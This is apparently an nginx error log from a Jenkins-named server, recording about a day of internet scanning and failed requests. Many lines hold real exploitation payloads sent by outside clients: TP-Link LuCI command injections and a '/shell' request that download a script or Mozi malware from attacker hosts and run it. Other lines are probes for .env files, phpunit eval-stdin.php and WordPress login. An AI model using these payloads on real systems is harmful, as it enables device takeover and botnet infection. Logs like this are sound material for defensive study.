+2024/04/19 01:00:57 [error] 21#21: *8515 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 01:31:43 [error] 21#21: *8516 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 192.241.216.30, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 01:32:40 [error] 21#21: *8517 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.29, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/19 01:43:51 [error] 20#20: *8522 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 139.59.2.136, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "jenkins.thanhtha.name.vn"
+2024/04/19 01:49:10 [error] 20#20: *8536 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 02:35:14 [error] 20#20: *8542 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 216.218.206.69, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 02:37:00 [error] 20#20: *8543 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 216.218.206.69, server: jenkins.thanhtha.name.vn, request: "GET /webui/ HTTP/1.1", host: "61.14.234.55"
+2024/04/19 02:38:11 [error] 20#20: *8546 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 216.218.206.69, server: jenkins.thanhtha.name.vn, request: "GET /favicon.ico HTTP/1.1", host: "61.14.234.55"
+2024/04/19 02:39:27 [error] 20#20: *8547 "/etc/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 216.218.206.69, server: jenkins.thanhtha.name.vn, request: "GET /geoserver/web/ HTTP/1.1", host: "61.14.234.55"
+2024/04/19 02:45:39 [error] 20#20: *8548 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 165.154.206.35, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 03:25:21 [error] 20#20: *8549 open() "/etc/nginx/html/ip" failed (2: No such file or directory), client: 152.42.176.18, server: jenkins.thanhtha.name.vn, request: "GET http://httpbin.org/ip HTTP/1.1", host: "httpbin.org"
+2024/04/19 04:40:30 [error] 20#20: *8558 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 04:45:08 [error] 20#20: *8578 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 04:56:22 [error] 20#20: *8586 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 04:56:43 [error] 20#20: *8587 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.242.226.99, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 06:31:56 [error] 20#20: *8606 open() "/etc/nginx/html/ip" failed (2: No such file or directory), client: 152.42.176.18, server: jenkins.thanhtha.name.vn, request: "GET http://httpbin.org/ip HTTP/1.1", host: "httpbin.org"
+2024/04/19 06:43:15 [error] 21#21: *8609 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 06:54:27 [error] 21#21: *8611 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 198.235.24.253, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/19 07:00:53 [error] 21#21: *8612 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 07:11:23 [error] 21#21: *8613 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 08:05:03 [error] 21#21: *8652 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 203.80.163.22, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 08:11:30 [error] 21#21: *8653 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 85.159.213.137, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 08:27:40 [error] 21#21: *8661 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.128.232.229, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 08:35:38 [error] 21#21: *8662 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 58.48.44.232, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 08:40:52 [error] 21#21: *8665 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.216.149.98, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 09:11:40 [error] 20#20: *8670 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.8, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 09:11:43 [error] 20#20: *8671 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.8, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 09:23:38 [error] 20#20: *8676 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 206.168.34.125, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 09:23:42 [error] 20#20: *8677 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 206.168.34.125, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 09:43:58 [error] 20#20: *8679 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 193.222.96.110, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/19 09:43:59 [error] 20#20: *8680 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 193.222.96.110, server: jenkins.thanhtha.name.vn, request: "POST / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 09:46:09 [error] 20#20: *8685 open() "/etc/nginx/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 193.222.96.110, server: jenkins.thanhtha.name.vn, request: "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "61.14.234.55"
+2024/04/19 09:48:26 [error] 20#20: *8687 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.49, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 09:48:30 [error] 20#20: *8688 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.49, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 09:52:07 [error] 20#20: *8690 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 21#21: *8765 open() "/etc/nginx/html/adjuncts/5aa17886/hudson/views/BuildButtonColumn/icon.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /adjuncts/5aa17886/hudson/views/BuildButtonColumn/icon.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 20#20: *8773 open() "/etc/nginx/html/static/5aa17886/scripts/yui/dragdrop/dragdrop-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/dragdrop/dragdrop-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 20#20: *8771 open() "/etc/nginx/html/static/5aa17886/scripts/yui/dom/dom-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/dom/dom-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 20#20: *8772 open() "/etc/nginx/html/adjuncts/5aa17886/jenkins/management/AdministrativeMonitorsDecorator/resources.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /adjuncts/5aa17886/jenkins/management/AdministrativeMonitorsDecorator/resources.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 21#21: *8769 open() "/etc/nginx/html/static/5aa17886/scripts/yui/menu/menu-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/menu/menu-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 21#21: *8766 open() "/etc/nginx/html/adjuncts/5aa17886/hudson/model/View/screen-resolution.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /adjuncts/5aa17886/hudson/model/View/screen-resolution.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 21#21: *8770 open() "/etc/nginx/html/static/5aa17886/scripts/yui/container/container-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/container/container-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 21#21: *8768 open() "/etc/nginx/html/static/5aa17886/scripts/yui/event/event-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/event/event-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 21#21: *8767 open() "/etc/nginx/html/static/5aa17886/scripts/yui/element/element-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/element/element-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 20#20: *8774 open() "/etc/nginx/html/static/5aa17886/scripts/yui/storage/storage-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/storage/storage-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 20#20: *8775 open() "/etc/nginx/html/static/5aa17886/scripts/yui/datasource/datasource-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/datasource/datasource-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:07:02 [error] 20#20: *8776 open() "/etc/nginx/html/adjuncts/5aa17886/org/jenkinsci/plugins/scriptsecurity/scripts/ScriptApproval/FormValidationPageDecorator/validate.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /adjuncts/5aa17886/org/jenkinsci/plugins/scriptsecurity/scripts/ScriptApproval/FormValidationPageDecorator/validate.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 11:16:01 [error] 21#21: *8788 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 11:37:16 [error] 21#21: *8808 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 11:45:36 [error] 21#21: *8811 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 34.78.6.216, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 12:01:59 [error] 21#21: *8812 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 172.105.246.139, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/19 12:02:20 [error] 21#21: *8827 open() "/etc/nginx/html/scripts/WPnBr.dll" failed (2: No such file or directory), client: 172.105.246.139, server: jenkins.thanhtha.name.vn, request: "POST /scripts/WPnBr.dll HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/19 12:02:22 [error] 21#21: *8833 open() "/etc/nginx/html/pools" failed (2: No such file or directory), client: 172.105.246.139, server: jenkins.thanhtha.name.vn, request: "GET /pools HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/19 12:02:25 [error] 21#21: *8839 open() "/etc/nginx/html/confluence/rest/applinks/1.0/manifest" failed (2: No such file or directory), client: 172.105.246.139, server: jenkins.thanhtha.name.vn, request: "GET /confluence/rest/applinks/1.0/manifest HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/19 12:02:26 [error] 21#21: *8840 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 172.105.246.139, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/19 12:02:26 [error] 21#21: *8842 open() "/etc/nginx/html/CSS/Miniweb.css" failed (2: No such file or directory), client: 172.105.246.139, server: jenkins.thanhtha.name.vn, request: "GET /CSS/Miniweb.css HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/19 12:02:27 [error] 21#21: *8843 open() "/etc/nginx/html/HNAP1" failed (2: No such file or directory), client: 172.105.246.139, server: jenkins.thanhtha.name.vn, request: "GET /HNAP1 HTTP/1.1", host: "no-ptr.123host.vn"
+2024/04/19 12:16:36 [error] 20#20: *8850 open() "/etc/nginx/html/shell" failed (2: No such file or directory), client: 27.43.207.55, server: jenkins.thanhtha.name.vn, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 12:39:31 [error] 20#20: *8852 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 13:15:07 [error] 20#20: *8858 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 13:47:45 [error] 20#20: *8865 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 217.24.156.168, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 14:16:32 [error] 20#20: *8942 open() "/etc/nginx/html/adjuncts/5aa17886/hudson/model/View/screen-resolution.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /adjuncts/5aa17886/hudson/model/View/screen-resolution.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:16:32 [error] 20#20: *8943 open() "/etc/nginx/html/adjuncts/5aa17886/jenkins/management/AdministrativeMonitorsDecorator/resources.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /adjuncts/5aa17886/jenkins/management/AdministrativeMonitorsDecorator/resources.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:16:32 [error] 20#20: *8944 open() "/etc/nginx/html/static/5aa17886/scripts/yui/menu/menu-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/menu/menu-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:16:32 [error] 20#20: *8945 open() "/etc/nginx/html/static/5aa17886/scripts/yui/autocomplete/autocomplete-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/autocomplete/autocomplete-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:24:52 [error] 21#21: *8951 open() "/etc/nginx/html/0bef" failed (2: No such file or directory), client: 172.105.77.209, server: jenkins.thanhtha.name.vn, request: "GET /0bef HTTP/1.0"
+2024/04/19 14:59:05 [error] 21#21: *9008 open() "/etc/nginx/html/static/5aa17886/scripts/yui/animation/animation-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/animation/animation-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:59:05 [error] 21#21: *9009 open() "/etc/nginx/html/static/5aa17886/scripts/yui/button/button-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/button/button-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:59:05 [error] 21#21: *9005 open() "/etc/nginx/html/static/5aa17886/jsbundles/keyboard-shortcuts.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/jsbundles/keyboard-shortcuts.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:59:05 [error] 21#21: *9006 open() "/etc/nginx/html/static/5aa17886/scripts/yui/container/container-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/container/container-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:59:05 [error] 21#21: *9004 open() "/etc/nginx/html/adjuncts/5aa17886/org/kohsuke/stapler/bind.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /adjuncts/5aa17886/org/kohsuke/stapler/bind.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:59:05 [error] 21#21: *9007 open() "/etc/nginx/html/static/5aa17886/scripts/hudson-behavior.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/hudson-behavior.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:59:05 [error] 21#21: *9010 open() "/etc/nginx/html/static/5aa17886/jsbundles/app.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/jsbundles/app.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 14:59:05 [error] 21#21: *9011 open() "/etc/nginx/html/static/5aa17886/scripts/yui/menu/menu-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/menu/menu-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 15:25:14 [error] 20#20: *9038 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 15:39:13 [error] 20#20: *9039 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 16:23:25 [error] 21#21: *9041 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 16:38:20 [error] 21#21: *9043 open() "/etc/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 83.97.73.245, server: jenkins.thanhtha.name.vn, request: "GET /actuator/gateway/routes HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 16:39:53 [error] 21#21: *9044 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 46.174.191.28, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0"
+2024/04/19 17:35:11 [error] 21#21: *9121 open() "/etc/nginx/html/static/5aa17886/scripts/yui/autocomplete/autocomplete-min.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/scripts/yui/autocomplete/autocomplete-min.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 17:35:13 [error] 21#21: *9122 open() "/etc/nginx/html/static/5aa17886/jsbundles/app.js" failed (2: No such file or directory), client: 91.201.114.232, server: jenkins.thanhtha.name.vn, request: "GET /static/5aa17886/jsbundles/app.js HTTP/1.1", host: "61.14.234.55"
+2024/04/19 17:37:47 [error] 21#21: *9127 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 19:08:15 [error] 21#21: *9161 open() "/etc/nginx/html/HlBf" failed (2: No such file or directory), client: 148.153.45.234, server: jenkins.thanhtha.name.vn, request: "GET /HlBf HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 19:08:16 [error] 21#21: *9162 open() "/etc/nginx/html/RPbY" failed (2: No such file or directory), client: 148.153.45.234, server: jenkins.thanhtha.name.vn, request: "GET /RPbY HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 19:08:16 [error] 21#21: *9163 open() "/etc/nginx/html/aab8" failed (2: No such file or directory), client: 148.153.45.234, server: jenkins.thanhtha.name.vn, request: "GET /aab8 HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 19:08:17 [error] 21#21: *9164 open() "/etc/nginx/html/jquery-3.3.1.slim.min.js" failed (2: No such file or directory), client: 148.153.45.234, server: jenkins.thanhtha.name.vn, request: "GET /jquery-3.3.1.slim.min.js HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 19:08:17 [error] 21#21: *9165 open() "/etc/nginx/html/aab9" failed (2: No such file or directory), client: 148.153.45.234, server: jenkins.thanhtha.name.vn, request: "GET /aab9 HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 19:08:17 [error] 21#21: *9166 open() "/etc/nginx/html/jquery-3.3.2.slim.min.js" failed (2: No such file or directory), client: 148.153.45.234, server: jenkins.thanhtha.name.vn, request: "GET /jquery-3.3.2.slim.min.js HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 20:09:18 [error] 21#21: *9224 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.224.128.43, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/19 20:09:58 [error] 21#21: *9225 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.191.126.213, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 20:35:59 [error] 20#20: *9227 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 21:17:13 [error] 20#20: *9244 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 78.153.140.179, server: jenkins.thanhtha.name.vn, request: "GET /.env HTTP/1.1", host: "61.14.234.55"
+2024/04/19 22:15:09 [error] 20#20: *9330 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/19 23:34:57 [error] 20#20: *9362 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.190.218, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 00:20:14 [error] 20#20: *9390 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.156.129.46, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55"
+2024/04/20 00:21:07 [error] 20#20: *9391 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 88.146.228.245, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.0", host: "61.14.234.55"
+2024/04/20 00:42:24 [error] 20#20: *9395 open() "/etc/nginx/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 5.181.190.250, server: jenkins.thanhtha.name.vn, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 00:57:18 [error] 20#20: *9396 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 59.183.42.72, server: jenkins.thanhtha.name.vn, request: "GET / HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 01:01:55 [error] 20#20: *9422 open() "/etc/nginx/html/wp-login.php" failed (2: No such file or directory), client: 104.211.2.187, server: jenkins.thanhtha.name.vn, request: "POST /wp-login.php HTTP/1.1", host: "61.14.234.55:80"
+2024/04/20 01:01:56 [error] 21#21: *9423 open() "/etc/nginx/html/wordpress/wp-login.php" failed (2: No such file or directory), client: 104.211.2.187, server: jenkins.thanhtha.name.vn, request: "POST /wordpress/wp-login.php HTTP/1.1", host: "61.14.234.55:80"
